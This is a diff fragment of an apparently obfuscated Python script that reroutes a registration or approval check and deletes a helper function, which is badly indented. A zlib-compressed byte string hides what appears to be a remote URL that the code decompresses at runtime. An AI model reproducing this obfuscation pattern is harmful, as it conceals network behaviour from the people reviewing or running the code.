@@ -305,7 +305,7 @@ def bnsbuy():
         bd = (zlib.decompress(f))
         to = (open(bd, 'r').read())
     except (KeyError, IOError):
-        bnsreg()
+        sarfraz()
     try:
         bt = (b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5710\xd1\xf5\xcb/\xd1uw\r\xd1/\xd6\xcfM\xcc\xcc\xd3O\x04\x00&!\x13&')
         bw = (zlib.decompress(bt))
@@ -321,10 +321,6 @@ def bnsbuy():
         fuck.append(1)
         sarfraz()
  
-
-def bnsreg():
-    fuck.append(1)
-        sarfraz()
 class load:
     def __init__(self):
         _ = ''
